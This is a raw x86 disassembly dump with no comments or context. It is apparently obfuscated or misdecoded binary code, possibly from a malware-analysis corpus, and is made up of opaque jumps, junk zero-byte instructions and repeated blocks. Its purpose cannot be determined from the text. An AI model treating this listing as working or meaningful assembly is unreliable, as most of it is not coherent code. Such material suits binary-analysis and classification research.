xor edi 0x517f5859
jno 0xfffffffff2c17b0f
push ecx
push ebx
call sub_401fa2
sub ecx 0x50515557
and esi 0x73595958
out 0x81 al
0x830f
push ebp
pushfd
call sub_4021fb
mov edx 0x7504c483
rol [ ecx + 0x108f0fc2 ] 0xff
mov esp 0xe2818371
jne r-xdata
jge r-xdata
mov [ fs : edi - 0x21 ] esi
loope r-xdata
ja r-xdata
and ebx 0xe381c67f
jne r-xdata
pop ecx
pop ecx
jne r-xdata
jo 0x7ff92c15
pop ecx
jno r-xdata
sub esi 0xf58595a
sub [ edi - 0x1 ] 0xffffffff
inc [ ecx - 0x70f0a53a ]
add [ eax ] 0x0
add [ ebx + 0x71 ] ah
insd
xchg [ edi ] cl
add [ eax ] al
add [ edi ] cl
push edx
push esp
push edx
call sub_40221e
sub ecx 0x850f5959
das
mov edi 0xff188d0f
jae r-xdata
and esi 0x89641273
jae r-xdata
mov ebp 0x478f0f5a
pushfd
push esi
call sub_4021f2
sub ebx 0xa48f0f
add [ eax ] al
sub [ ecx + 0x1 ] 0x0
add [ edi ] cl
adc [ edi + edx * 2 + 0x56 ] 0x55
call sub_40230c
add esi 0xa6830f
add [ eax ] al
mov esp 0x58246c83
add al [ ebx + 0xf5914ec ]
test esp ebx
add [ eax ] al
add [ ebx + 0xf04c483 ] bh
add esp 0x4
jne r-xdata
mov eax [ fs : 0xff37958 ]
test [ ebx - 0x1e ] esi
pop eax
jge r-xdata
jge 0xffffffffffa2a4a7
jne r-xdata
or edx 0xf3812e79
jg r-xdata
les eax [ edi + ecx ]
jae r-xdata
js 0x7548e7d1
jg r-xdata
ja 0xcaa5cd
pop ecx
pop ecx
jns r-xdata
add edx 0xc1870f58
sub eax 0x6c7315ff
pop ecx
jno r-xdata
call 0xf44ea00
and [ ecx - 0x2 ] 0xffffffff
inc [ ecx - 0x1b72f03e ]
pop eax
pop eax
pop edx
jne r-xdata
call 0xf48e6d7
lea eax [ ecx + 0x1 ]
add [ eax ] al
jg r-xdata
ja 0xffffffffff9ba474
jae r-xdata
add edx 0xff108f0f
pop ecx
jns r-xdata
jno 0xffffffff874f575a
jg r-xdata
xor ecx 0xff70810f
jg r-xdata
or eax 0x97e8569c
add [ eax ] al
add [ ecx - 0x5b70f015 ] al
add [ eax ] al
add [ ecx + 0xc775aca ] al
jno 0xffffffffefc15fe1
pop edx
jge r-xdata
jo 0xffffffff854f7cc6
pop eax
jae r-xdata
and esi 0xc2817577
ja r-xdata
xor ecx 0x30870f59
add [ eax ] eax
add [ edi ] cl
xor [ ebx + 0x7a ] 0xffffffe8
add esp 0x8
or bh [ ebp + 0x478f0f5a ]
jno r-xdata
js 0x7f44e78c
add [ eax ] al
dec ecx
pop ecx
jne r-xdata
jbe 0xffcf4cb
jae r-xdata
call sub_402383
jb 0xffffffff81b2a039
or edx 0x54549c55
jno r-xdata
and ebx 0x870f4975
ja r-xdata
pop edx
mov eax 0xff55870f
ja r-xdata
or ebx 0xff6e8f0f
jae r-xdata
call [ 0xffffffffc181727f ]
pop edx
jg r-xdata
and [ edx + 0xf000000 ] 0xffffff8d
and ecx 0xf04c483
add esp 0x4
jg r-xdata
je 0xffffffff804f97e7
jge r-xdata
add edx 0xbf810f
add [ eax ] al
jno r-xdata
call [ 0xfbf3f7f ]
lea ebx [ eax ]
sbb [ edi ] ecx
mov [ edi ] cs
jno r-xdata
jge 0xffffffffffa0a80a
jne r-xdata
mov [ fs : ebp + 0x19 ] esi
jae r-xdata
xor esi 0xe681cd75
ja r-xdata
xor ebx 0xff3d870f
call sub_40216e
and ecx 0x6c870f59
push edi
push edi
push ebp
pushfd
add eax 0xde810f
add [ eax ] al
jae r-xdata
and edx 0xff53830f
pop edx
pop edx
jne r-xdata
jne r-xdata
mov eax 0xfeef890f
jns r-xdata
sub eax 0x755a5858
mov ah 0x81
0x9c55
jge r-xdata
jpe 0x74cd340e
add esp 0x4
jae r-xdata
jl 0xf3a54f
jae r-xdata
jmp 0xffffffffff79a2b5
pop ecx
jno r-xdata
mov ecx 0x15ff2d7f
jae r-xdata
or ecx 0xf18d0f
add [ eax ] al
push esp
push ebp
push edi
sub esp 0x4
call sub_402229
jae 0xffffffffff43aa4e
xor ecx 0x890fd079
or esi 0xff24810f
ja r-xdata
and eax 0x4c48358
pop eax
jg r-xdata
jge 0xffffffff894f7c48
jg r-xdata
add eax 0x5abb2979
jae r-xdata
sub ecx 0x92810f59
add [ eax ] al
add [ ecx - 0x7e39801d ] al
jecxz r-xdata
jns r-xdata
sub ebx 0xe8525452
insb
push eax
pushfd
add ebx 0xdc7f585a
pop ecx
jno r-xdata
and edi 0x800fae73
pop eax
pop ecx
jns r-xdata
ja r-xdata
jno 0xffffffffe89176e5
push 0x81ffffff
out 0x77 al
jne r-xdata
sub esp 0x28
pop ecx
pop edx
jne r-xdata
add [ esp + 0x64 ] r-xdata
sub ebx 0xff2f850f
jns 0x158a7a9
push edi
call sub_40247b
jg 0xfffffffff0b37ea2
add edx 0xc381ea77
pop edx
pop eax
jg r-xdata
jno r-xdata
add esp 0x4
pop eax
jge r-xdata
jbe 0x133b325
pop edx
jg r-xdata
mov [ fs : 0x15ffe47d ] eax
pop ecx
ja r-xdata
xor eax 0xfef4870f
cmp edi 0xffffffff
inc [ ecx + 0x1a830ff3 ]
out dx eax
retn 0x810f
add [ eax ] al
add eax 0x4c4835a
jae r-xdata
jae r-xdata
jo 0x5866199e
ja r-xdata
add edi 0xff74830f
add [ eax ] al
jno 0xf9a7e78
jae r-xdata
mov [ fs : 0xffffffff8a0f6d71 ] eax
jno r-xdata
jae 0xffffffff84289cc4
jae r-xdata
call 0xffffffff854f7eb2
xor al 0xff
pop ecx
ja r-xdata
jge 0xffffffff9c95c153
jo 0xffffffffa2c13366
push ecx
push edx
call sub_40244b
and edx 0x185e856
add [ eax ] al
jl 0xffffffffc1c157a8
push edx
call sub_4023e7
and esi 0xe981dd73
pushfd
push edi
pushfd
call sub_402462
jo 0xff99a4f
jo 0xffffffff894f7e8c
jae r-xdata
je 0xffffffffff6da896
jge r-xdata
les ecx [ eax ]
jge r-xdata
add ecx 0x870f5859
inc edi
add [ eax ] eax
add [ ecx - 0x7ef0a60a ] al
lodsb [ esi ]
pop edx
jne r-xdata
mov eax [ fs : 0xffffffffc9812675 ]
push esi
call sub_402425
and edi 0x850fc67f
pop ecx
pop eax
ja r-xdata
push ebp
pushfd
lea ecx [ edi ]
and [ eax - 0x1 ] 0xffffffff
dec [ edi ]
lea edx [ eax - 0x64 ]
insd
jne r-xdata
and edx 0x83519c54
in al dx
or al 0xe8
iretd
jae r-xdata
mov ebp 0x64f37759
mov eax [ 0xffffffffc9812675 ]
xor ecx 0x4ce85251
add [ eax ] al
add [ ecx - 0x7a17a91e ] al
add [ eax ] eax
add [ edi ] cl
sbb [ ecx + 0xf ] 0x81
mov [ 0xf000000 ] al
push esp
push eax
call sub_4024cb
xor edi 0x5f795958
jge r-xdata
add [ eax ] al
add [ edi ] cl
xchg [ edi - 0x30 ] bh
mov esp 0x11b8f0f
add [ eax ] al
sub ecx 0x8199755a
neg [ eax + 0x59 ]
jns r-xdata
xor esi 0xac810f59
jg 0xffffffffff53a9d6
push esp
pushfd
push ecx
sub esp 0xc
call sub_402448
mov [ fs : 0xffffffff870f5a59 ] eax
lodsd [ esi ]
add [ eax ] al
add [ esi + 0x790cc483 ] bh
iretd
or edi 0x80c481
add [ eax ] al
retn
sub_401fa2
jns r-xdata
jns r-xdata
xor esi 0x58b93d7f
jno r-xdata
push ebp
call sub_401f27
mov [ fs : ebx - 0x7af0fb3c ] eax
mov esp 0xffffffe
test [ edi ] cl
adc [ eax + 0x5fffffe ] 0x59
sub eax 0xf08c483
xor [ ebx ] 0xb9000001
jae r-xdata
jno 0x73987a0e
jg r-xdata
jne 0x24c12ff2
jae r-xdata
sub ecx 0xe1813e75
pop eax
jae r-xdata
add eax 0xf9b7159
test [ edx + 0xf ] ebx
and [ edi + edi * 8 ] 0x15ffffff
or [ 0xffffffffff6d830f ] 0xfe9ffff
mov [ edx - 0x7f000000 ] ecx
iretd
jne r-xdata
and eax 0x8b0f327f
pop eax
pop ecx
jge r-xdata
jns r-xdata
jge 0xffffffffb8af9f29
pushfd
call sub_401f12
mov eax [ fs : 0xffffffff9ce8c173 ]
push edi
push eax
push edx
call sub_401fb2
ja 0x504a3b9
call [ 0x29e85351 ]
add [ eax ] al
add [ ecx + 0x515557e9 ] al
ja r-xdata
and ebx 0xcf812475
jno r-xdata
pop ecx
or eax 0xf04c483
mov ebp ebp
jno r-xdata
jmp [ 0xffffffff8f0f3973 ]
jae r-xdata
jae r-xdata
pop ecx
jno r-xdata
pop eax
jge r-xdata
call [ 0x25ff9e79 ]
pop edx
jg r-xdata
jpo 0xf70988f
jae r-xdata
sub eax 0x4d795a58
jg r-xdata
add edi 0x848f0f
add [ eax ] al
sub ecx 0x811f755a
pop eax
pop edx
jns r-xdata
mov esi 0x55559c9c
jae r-xdata
xor edx 0x8a810f
add [ eax ] al
jae r-xdata
je 0xffffffffa3a4c568
jg r-xdata
jg 0xffffffff9c94739d
add esp 0x4
jns r-xdata
mov eax 0xc7819173
sbb [ edx + 0x58 ] 0xf8830f
add [ eax ] al
jne 0xf44e3c9
push eax
push edi
push ebp
push ecx
and ecx 0xff378f0f
jg r-xdata
mov ecx 0xd8810f58
add [ eax ] al
add [ edi ] cl
sbb [ eax + 0x5a ] 0xd817358
ja r-xdata
and ecx 0xf681ad79
jns r-xdata
jmp 0xcaa8d2
call sub_402052
xor edi 0x517f5859
jno 0xfffffffff2c17b0f
push ecx
push ebx
call sub_401fa2
sub ecx 0x50515557
and esi 0x73595958
out 0x81 al
0x830f
jns r-xdata
push esi
push esi
call sub_40209d
sub ebx 0xfeace855
pushfd
pushfd
push ebp
push ebp
jpo 0x53bd7994
push edx
call sub_401fd3
or edi 0x830f5858
jne r-xdata
pop eax
jns r-xdata
sub eax 0xfec5e89c
add [ eax + eax - 0x7af10000 ] 0xea810971
jg r-xdata
mov [ fs : 0xffffffff840f0e79 ] eax
jno 0x16400d6c
jae r-xdata
je 0xffffffff814fc168
jne r-xdata
jno 0xffffffff834f7796
xor edx 0x81257159
r-xdata
jg r-xdata
and ecx 0xd7850f
add [ eax ] al
clc
add [ eax ] al
add [ edi ] cl
test [ ebx - 0x7ef0fb3c ] eax
test [ eax ] al
add [ eax ] al
jne 0xffffffffeac128c2
sub_401fb2
pop eax
pop edx
pop eax
jae r-xdata
pop edx
pop eax
jae r-xdata
or eax 0xff6d830f
pop eax
pop ecx
jge r-xdata
jne 0xf44e3c9
pop ecx
or eax 0xf04c483
mov ebp ebp
add [ eax + eax - 0x7af10000 ] 0xea810971
jg r-xdata
jne 0x24c12ff2
jno r-xdata
push ebp
call sub_401f27
mov [ fs : ebx - 0x7af0fb3c ] eax
mov esp 0xffffffe
test [ edi ] cl
adc [ eax + 0x5fffffe ] 0x59
sub eax 0xf08c483
xor [ ebx ] 0xb9000001
jne r-xdata
and eax 0x8b0f327f
jae r-xdata
sub ecx 0xe1813e75
pushfd
call sub_401f12
mov eax [ fs : 0xffffffff9ce8c173 ]
push edi
push eax
push edx
call sub_401fb2
ja 0x504a3b9
call [ 0x29e85351 ]
add [ eax ] al
add [ ecx + 0x515557e9 ] al
jns r-xdata
jge 0xffffffffb8af9f29
jae r-xdata
pop ecx
jno r-xdata
jno r-xdata
jmp [ 0xffffffff8f0f3973 ]
jae r-xdata
pop eax
pop edx
jns r-xdata
mov esi 0x55559c9c
jae r-xdata
xor edx 0x8a810f
add [ eax ] al
jae r-xdata
sub eax 0x4d795a58
jg r-xdata
add edi 0x848f0f
add [ eax ] al
sub ecx 0x811f755a
ja r-xdata
and ecx 0xf681ad79
jns r-xdata
jmp 0xcaa8d2
jg r-xdata
mov ecx 0xd8810f58
add [ eax ] al
add [ edi ] cl
sbb [ eax + 0x5a ] 0xd817358
push eax
push edi
push ebp
push ecx
and ecx 0xff378f0f
jno 0x16400d6c
pop edx
jg r-xdata
jpo 0xf70988f
jg r-xdata
mov [ fs : 0xffffffff840f0e79 ] eax
add esp 0x4
jns r-xdata
mov eax 0xc7819173
sbb [ edx + 0x58 ] 0xf8830f
add [ eax ] al
jns r-xdata
xor edx 0x81257159
r-xdata
pop eax
jns r-xdata
sub eax 0xfec5e89c
jae r-xdata
je 0xffffffff814fc168
jne r-xdata
jno 0xffffffff834f7796
jg r-xdata
jg 0xffffffff9c94739d
ja r-xdata
jg r-xdata
and ecx 0xd7850f
add [ eax ] al
clc
add [ eax ] al
add [ edi ] cl
test [ ebx - 0x7ef0fb3c ] eax
test [ eax ] al
add [ eax ] al
jne 0xffffffffeac128c2
push esi
push esi
call sub_40209d
sub ebx 0xfeace855
pushfd
pushfd
push ebp
push ebp
jpo 0x53bd7994
push edx
call sub_401fd3
or edi 0x830f5858
jne r-xdata
pop eax
jge r-xdata
call [ 0x25ff9e79 ]
jns r-xdata
jae r-xdata
je 0xffffffffa3a4c568
call sub_402052
xor edi 0x517f5859
jno 0xfffffffff2c17b0f
push ecx
push ebx
call sub_401fa2
sub ecx 0x50515557
and esi 0x73595958
out 0x81 al
0x830f
sub_401fd3
jg r-xdata
pop eax
add esp 0x4
sub ecx 0x811f755a
pop eax
pop edx
jns r-xdata
mov esi 0x55559c9c
ja r-xdata
and ecx 0xf681ad79
pop ecx
jno r-xdata
jno 0x16400d6c
jg r-xdata
mov ecx 0xd8810f58
add [ eax ] al
add [ edi ] cl
sbb [ eax + 0x5a ] 0xd817358
jae r-xdata
xor edx 0x8a810f
add [ eax ] al
jns r-xdata
jg r-xdata
mov [ fs : 0xffffffff840f0e79 ] eax
jns r-xdata
jmp 0xcaa8d2
jno r-xdata
jmp [ 0xffffffff8f0f3973 ]
jns r-xdata
xor edx 0x81257159
r-xdata
pop edx
jg r-xdata
jpo 0xf70988f
jae r-xdata
sub eax 0x4d795a58
jae r-xdata
je 0xffffffff814fc168
add esp 0x4
jns r-xdata
mov eax 0xc7819173
sbb [ edx + 0x58 ] 0xf8830f
add [ eax ] al
jne 0xf44e3c9
push edi
push ebp
push ecx
and ecx 0xff378f0f
jg r-xdata
jg 0xffffffff9c94739d
ja r-xdata
pop eax
jns r-xdata
sub eax 0xfec5e89c
add [ eax + eax - 0x7af10000 ] 0xea810971
push esi
push esi
call sub_40209d
sub ebx 0xfeace855
pushfd
pushfd
push ebp
push ebp
jpo 0x53bd7994
push edx
call sub_401fd3
or edi 0x830f5858
jne r-xdata
pop eax
jge r-xdata
call [ 0x25ff9e79 ]
jne r-xdata
jno 0xffffffff834f7796
push ebp
call sub_401f27
mov [ fs : ebx - 0x7af0fb3c ] eax
mov esp 0xffffffe
test [ edi ] cl
adc [ eax + 0x5fffffe ] 0x59
sub eax 0xf08c483
xor [ ebx ] 0xb9000001
or eax 0xf04c483
mov ebp ebp
jae r-xdata
je 0xffffffffa3a4c568
jg r-xdata
push eax
and ecx 0xd7850f
add [ eax ] al
clc
add [ eax ] al
add [ edi ] cl
test [ ebx - 0x7ef0fb3c ] eax
test [ eax ] al
add [ eax ] al
jne 0xffffffffeac128c2
jg r-xdata
jne 0x24c12ff2
jae r-xdata
sub ecx 0xe1813e75
call sub_402052
xor edi 0x517f5859
jno 0xfffffffff2c17b0f
push ecx
push ebx
call sub_401fa2
sub ecx 0x50515557
and esi 0x73595958
out 0x81 al
0x830f
jns r-xdata
jne r-xdata
and eax 0x8b0f327f
pop eax
pop ecx
jge r-xdata
jge 0xffffffffb8af9f29
pushfd
call sub_401f12
mov eax [ fs : 0xffffffff9ce8c173 ]
push edi
push eax
push edx
call sub_401fb2
ja 0x504a3b9
call [ 0x29e85351 ]
add [ eax ] al
add [ ecx + 0x515557e9 ] al
jno r-xdata
pop ecx
jae r-xdata
jae r-xdata
jg r-xdata
add edi 0x848f0f
add [ eax ] al
sub_40201e
pop eax
pop ecx
pop ecx
jae r-xdata
pop eax
pop eax
jae r-xdata
or edx 0xff50830f
pop ecx
pop eax
jg r-xdata
mov ebx 0x8f0f6975
pop edx
jne r-xdata
jno 0xfffffffff2c17b0f
push ecx
push ebx
call sub_401fa2
sub ecx 0x50515557
and esi 0x73595958
out 0x81 al
0x830f
pushfd
push ebx
push esp
pushfd
add esi 0xf337d58
test [ edi - 0x5b ] bh
pop ecx
jno r-xdata
jno 0x16400d6c
jae r-xdata
xor edx 0x8a810f
add [ eax ] al
jns r-xdata
jns r-xdata
jmp 0xcaa8d2
jg r-xdata
mov ecx 0xd8810f58
add [ eax ] al
add [ edi ] cl
sbb [ eax + 0x5a ] 0xd817358
jno r-xdata
jmp [ 0xffffffff8f0f3973 ]
pop edx
jg r-xdata
jpo 0xf70988f
jg r-xdata
mov [ fs : 0xffffffff840f0e79 ] eax
jae r-xdata
sub eax 0x4d795a58
add esp 0x4
jns r-xdata
mov eax 0xc7819173
sbb [ edx + 0x58 ] 0xf8830f
add [ eax ] al
jne 0xf44e3c9
jns r-xdata
xor edx 0x81257159
r-xdata
call sub_402052
xor edi 0x517f5859
push edi
push ebp
push ecx
and ecx 0xff378f0f
pop eax
jns r-xdata
sub eax 0xfec5e89c
add [ eax + eax - 0x7af10000 ] 0xea810971
jae r-xdata
je 0xffffffff814fc168
jne r-xdata
jno 0xffffffff834f7796
push ebp
call sub_401f27
mov [ fs : ebx - 0x7af0fb3c ] eax
mov esp 0xffffffe
test [ edi ] cl
adc [ eax + 0x5fffffe ] 0x59
sub eax 0xf08c483
xor [ ebx ] 0xb9000001
jg r-xdata
jg 0xffffffff9c94739d
ja r-xdata
jg r-xdata
push eax
and ecx 0xd7850f
add [ eax ] al
clc
add [ eax ] al
add [ edi ] cl
test [ ebx - 0x7ef0fb3c ] eax
test [ eax ] al
add [ eax ] al
jne 0xffffffffeac128c2
jg r-xdata
jne 0x24c12ff2
jae r-xdata
sub ecx 0xe1813e75
pushfd
pushfd
push ebp
push ebp
jpo 0x53bd7994
push edx
call sub_401fd3
or edi 0x830f5858
jne r-xdata
pop eax
jge r-xdata
call [ 0x25ff9e79 ]
jns r-xdata
jne r-xdata
and eax 0x8b0f327f
pop eax
pop ecx
jge r-xdata
jge 0xffffffffb8af9f29
pushfd
call sub_401f12
mov eax [ fs : 0xffffffff9ce8c173 ]
push edi
push eax
push edx
call sub_401fb2
ja 0x504a3b9
call [ 0x29e85351 ]
add [ eax ] al
add [ ecx + 0x515557e9 ] al
or eax 0xf04c483
mov ebp ebp
jae r-xdata
je 0xffffffffa3a4c568
jno r-xdata
pop ecx
jae r-xdata
jae r-xdata
jg r-xdata
add edi 0x848f0f
add [ eax ] al
sub ecx 0x811f755a
pop eax
pop edx
jns r-xdata
push esi
push esi
call sub_40209d
sub ebx 0xfeace855
mov esi 0x55559c9c
ja r-xdata
and ecx 0xf681ad79
sub_402052
pushfd
jae r-xdata
pop eax
pop edx
jns r-xdata
mov esi 0x55559c9c
ja r-xdata
and ecx 0xf681ad79
pop ecx
jno r-xdata
jno 0x16400d6c
jg r-xdata
mov ecx 0xd8810f58
add [ eax ] al
add [ edi ] cl
sbb [ eax + 0x5a ] 0xd817358
jae r-xdata
xor edx 0x8a810f
add [ eax ] al
jns r-xdata
jg r-xdata
mov [ fs : 0xffffffff840f0e79 ] eax
jns r-xdata
jmp 0xcaa8d2
jno r-xdata
jmp [ 0xffffffff8f0f3973 ]
jns r-xdata
xor edx 0x81257159
r-xdata
pop edx
jg r-xdata
jpo 0xf70988f
jae r-xdata
sub eax 0x4d795a58
jae r-xdata
je 0xffffffff814fc168
add esp 0x4
jns r-xdata
mov eax 0xc7819173
sbb [ edx + 0x58 ] 0xf8830f
add [ eax ] al
jne 0xf44e3c9
push edi
push ebp
push ecx
and ecx 0xff378f0f
jg r-xdata
jg 0xffffffff9c94739d
ja r-xdata
pop eax
jns r-xdata
sub eax 0xfec5e89c
add [ eax + eax - 0x7af10000 ] 0xea810971
push esi
push esi
call sub_40209d
sub ebx 0xfeace855
pushfd
pushfd
push ebp
push ebp
jpo 0x53bd7994
push edx
call sub_401fd3
or edi 0x830f5858
jne r-xdata
pop eax
jge r-xdata
call [ 0x25ff9e79 ]
jne r-xdata
jno 0xffffffff834f7796
push ebp
call sub_401f27
mov [ fs : ebx - 0x7af0fb3c ] eax
mov esp 0xffffffe
test [ edi ] cl
adc [ eax + 0x5fffffe ] 0x59
sub eax 0xf08c483
xor [ ebx ] 0xb9000001
or eax 0xf04c483
mov ebp ebp
jae r-xdata
je 0xffffffffa3a4c568
jg r-xdata
push eax
and ecx 0xd7850f
add [ eax ] al
clc
add [ eax ] al
add [ edi ] cl
test [ ebx - 0x7ef0fb3c ] eax
test [ eax ] al
add [ eax ] al
jne 0xffffffffeac128c2
jg r-xdata
jne 0x24c12ff2
jae r-xdata
sub ecx 0xe1813e75
call sub_402052
xor edi 0x517f5859
jno 0xfffffffff2c17b0f
push ecx
push ebx
call sub_401fa2
sub ecx 0x50515557
and esi 0x73595958
out 0x81 al
0x830f
jns r-xdata
jne r-xdata
and eax 0x8b0f327f
pop eax
pop ecx
jge r-xdata
jge 0xffffffffb8af9f29
push edi
push eax
push edx
call sub_401fb2
ja 0x504a3b9
pushfd
call sub_401f12
mov eax [ fs : 0xffffffff9ce8c173 ]
call [ 0x29e85351 ]
add [ eax ] al
add [ ecx + 0x515557e9 ] al
jno r-xdata
pop ecx
jae r-xdata
jg r-xdata
add edi 0x848f0f
add [ eax ] al
sub ecx 0x811f755a
sub_40209d
sub [ esp + 0x40 ] r-xdata
sub esp 0x10
pop edx
ja r-xdata
jg r-xdata
jmp [ 0xce8d0f ]
jge r-xdata
jmp 0xffffffff844f5253
jno r-xdata
sub esi 0x73bd047f
push ebp
ja r-xdata
jmp [ 0xfffffffff381df77 ]
pop eax
jne r-xdata
xor edi 0x9b810f
add [ eax ] al
jl 0xfffffffff6c1df82
jne r-xdata
add edi 0xad850f58
add [ eax ] al
add al ch
ja r-xdata
call 0xffc9a91
cmp [ edi + 0x7f ] 0x81

ja r-xdata
jg r-xdata
xor esi 0x25ffca77
jg r-xdata
jo 0xffffffffcbc1a0bc
jns r-xdata
mov edi 0x9c555757
jge r-xdata
jmp [ 0xffffffff8964ba73 ]
jg r-xdata
add ecx 0xaa890f
add [ eax ] al
jns r-xdata
mov [ fs : edi ] ecx
or esp 0x0
add [ eax ] al
jns r-xdata
mov ebp 0x79055573
sub [ ebx - 0x7ed288a6 ] edi
jae r-xdata
xor ebx 0xff728f0f
jae r-xdata
ja 0xffffffff89a45e58
jge r-xdata
call [ 0xffffffffca81677d ]
jae r-xdata
xor ecx 0xc18d0f
add [ eax ] al
ja r-xdata
mov ebp 0xf5d7d58
cmp [ ebp + 0x36 ] 0x3d77870f
jns r-xdata
test [ edi ] 0x9b81
add [ edi ] cl
mov ebx 0x812d775a
jg r-xdata
and ebx 0xff5a870f
jg r-xdata
pop edx
pop edx
jno r-xdata
mov esi 0x83555251
in al dx
add al 0xe8
sti
add [ eax ] al
add [ ecx - 0xb1800d ] al
adc eax 0xc181727f
sub [ esp + 0x58 ] 0x2
sub esp 0x14
pop ecx
jne r-xdata
je 0xffffffffffa3a8f3
ja r-xdata
jge 0x71fc60fa
jge r-xdata
mov [ fs : edi - 0x21 ] esi
jae r-xdata
or edx 0xf0c775a
xor [ ebx + 0x3e ] 0x5a59ef81
jne r-xdata
push ebp
pushfd
call sub_4021fb
mov edx 0x7504c483
rol [ ecx + 0x108f0fc2 ] 0xff
mov esp 0xe2818371
jne r-xdata
jno r-xdata
mov ebx 0xf04c483
jno r-xdata
mov [ fs : edx + 0x5a ] ebx
add [ ecx + 0x42850fe2 ] 0xffffffff
jne r-xdata
or edx 0xf3812e79
pushfd
push esi
call sub_4021f2
sub ebx 0xa48f0f
add [ eax ] al
sub [ ecx + 0x1 ] 0x0
add [ edi ] cl
adc [ edi + edx * 2 + 0x56 ] 0x55
call sub_40230c
add esi 0xa6830f
add [ eax ] al
mov esp 0x58246c83
add al [ ebx + 0xf5914ec ]
test esp ebx
add [ eax ] al
add [ ebx + 0xf04c483 ] bh
add esp 0x4
jne r-xdata
mov eax [ fs : 0xff37958 ]
test [ ebx - 0x1e ] esi
pop eax
jge r-xdata
jge 0xffffffffffa2a4a7
pop eax
ja r-xdata
xor edx 0x880f5e7f
add [ eax ] al
jno r-xdata
sub esi 0x89641f79
jg r-xdata
xor ecx 0xff70810f
jg r-xdata
or eax 0x97e8569c
add [ eax ] al
add [ ecx - 0x5b70f015 ] al
add [ eax ] al
add [ ecx + 0xc775aca ] al
jno 0xffffffffefc15fe1
jae r-xdata
add edx 0xff108f0f
pop ecx
jns r-xdata
jno 0xffffffff874f575a
jne r-xdata
sub edi 0x64244481
cwde
sub [ eax ] al
add esp 0x4
ja r-xdata
jl 0xffffffffffacb21f
jae r-xdata
ja 0xffffffffa3c331b7
push ecx
push edx
push ebp
sub esp 0x4
call sub_4021be
xor ebx 0x15ff4e7f
mov edx 0xff47830f
ja r-xdata
or ebx 0xff6e8f0f
jae r-xdata
call [ 0xffffffffc181727f ]
ja r-xdata
pop edx
mov eax 0xff55870f
jg r-xdata
jpo 0xdea79d
pop eax
pop ecx
jne r-xdata
mov [ fs : edi ] ecx
test [ eax - 0x47000000 ] edi
jne r-xdata
jge r-xdata
add esi 0x83575554
in al dx
add al 0xe8
jae r-xdata
sub ecx 0xfeea830f
add [ eax ] al
add [ edi ] cl
test [ edi + 0x75 ] bh
ja r-xdata
xor ebx 0xff3d870f
call sub_40216e
and ecx 0x6c870f59
push edi
push edi
push ebp
pushfd
add eax 0xde810f
add [ eax ] al
push ebp
pushfd
push esp
push esp
call [ 0xffffffffe9816c73 ]
add [ eax ] al
ja r-xdata
sub ebx 0xec835656
adc al ch
jpe r-xdata
push esi
call sub_40258c
xor esi 0x72870f59
add [ eax ] eax
add [ esp + edx * 2 + 0xd5e850 ] bh
add [ eax ] al
jg r-xdata
sub edi 0xf681b871
jne r-xdata
add esp 0x8
jne r-xdata
add ebx 0xab810f
add [ eax ] al
xor al [ ecx ]
add [ eax ] al
jae r-xdata
jmp 0xffffffffff79a2b5
loope r-xdata
ja r-xdata
and ebx 0xe381c67f
jne r-xdata
pop ecx
pop ecx
jne r-xdata
jo 0x7ff92c15
pop ecx
jno r-xdata
sub esi 0xf58595a
sub [ edi - 0x1 ] 0xffffffff
inc [ ecx - 0x70f0a53a ]
add [ eax ] 0x0
add [ ebx + 0x71 ] ah
insd
xchg [ edi ] cl
add [ eax ] al
add [ edi ] cl
push edx
push esp
push edx
call sub_40221e
sub ecx 0x850f5959
das
mov edi 0xff188d0f
jae r-xdata
and esi 0x89641273
jae r-xdata
mov ebp 0x478f0f5a
jg r-xdata
add eax 0x5abb2979
jg r-xdata
les eax [ edi + ecx ]
jae r-xdata
js 0x7548e7d1
jg r-xdata
ja 0xcaa5cd
pop ecx
pop ecx
jns r-xdata
add edx 0xc1870f58
sub eax 0x6c7315ff
pop ecx
jno r-xdata
call 0xf44ea00
and [ ecx - 0x2 ] 0xffffffff
inc [ ecx - 0x1b72f03e ]
pop eax
pop eax
pop edx
jne r-xdata
call 0xf48e6d7
lea eax [ ecx + 0x1 ]
add [ eax ] al
jg r-xdata
ja 0xffffffffff9ba474
pop edx
jge r-xdata
jo 0xffffffff854f7cc6
pop eax
jae r-xdata
and esi 0xc2817577
ja r-xdata
xor ecx 0x30870f59
add [ eax ] eax
add [ edi ] cl
xor [ ebx + 0x7a ] 0xffffffe8
add esp 0x8
or bh [ ebp + 0x478f0f5a ]
jno r-xdata
js 0x7f44e78c
add [ eax ] al
dec ecx
pop ecx
jne r-xdata
jbe 0xffcf4cb
jae r-xdata
call sub_402383
jb 0xffffffff81b2a039
or edx 0x54549c55
jno r-xdata
and ebx 0x870f4975
pop edx
jg r-xdata
and [ edx + 0xf000000 ] 0xffffff8d
and ecx 0xf04c483
add esp 0x4
jg r-xdata
je 0xffffffff804f97e7
jge r-xdata
add edx 0xbf810f
add [ eax ] al
jno r-xdata
call [ 0xfbf3f7f ]
lea ebx [ eax ]
sbb [ edi ] ecx
mov [ edi ] cs
jno r-xdata
jge 0xffffffffffa0a80a
jne r-xdata
mov [ fs : ebp + 0x19 ] esi
jae r-xdata
xor esi 0xe681cd75
jae r-xdata
and edx 0xff53830f
pop edx
pop edx
jne r-xdata
jne r-xdata
mov eax 0xfeef890f
jns r-xdata
sub eax 0x755a5858
mov ah 0x81
0x9c55
jge r-xdata
jpe 0x74cd340e
add esp 0x4
jae r-xdata
jl 0xf3a54f
pop ecx
jno r-xdata
mov ecx 0x15ff2d7f
jae r-xdata
or ecx 0xf18d0f
add [ eax ] al
push esp
push ebp
push edi
sub esp 0x4
call sub_402229
jae 0xffffffffff43aa4e
xor ecx 0x890fd079
or esi 0xff24810f
ja r-xdata
and eax 0x4c48358
pop eax
jg r-xdata
jge 0xffffffff894f7c48
jae r-xdata
sub ecx 0x92810f59
add [ eax ] al
add [ ecx - 0x7e39801d ] al
jecxz r-xdata
jns r-xdata
sub ebx 0xe8525452
insb
push eax
pushfd
add ebx 0xdc7f585a
pop ecx
jno r-xdata
and edi 0x800fae73
pop eax
pop ecx
jns r-xdata
ja r-xdata
jno 0xffffffffe89176e5
push 0x81ffffff
out 0x77 al
jne r-xdata
sub esp 0x28
pop ecx
pop edx
jne r-xdata
add [ esp + 0x64 ] r-xdata
sub ebx 0xff2f850f
jns 0x158a7a9
push edi
call sub_40247b
jg 0xfffffffff0b37ea2
add edx 0xc381ea77
pop edx
pop eax
jg r-xdata
jno r-xdata
add esp 0x4
pop eax
jge r-xdata
jbe 0x133b325
pop edx
jg r-xdata
mov [ fs : 0x15ffe47d ] eax
pop ecx
ja r-xdata
xor eax 0xfef4870f
cmp edi 0xffffffff
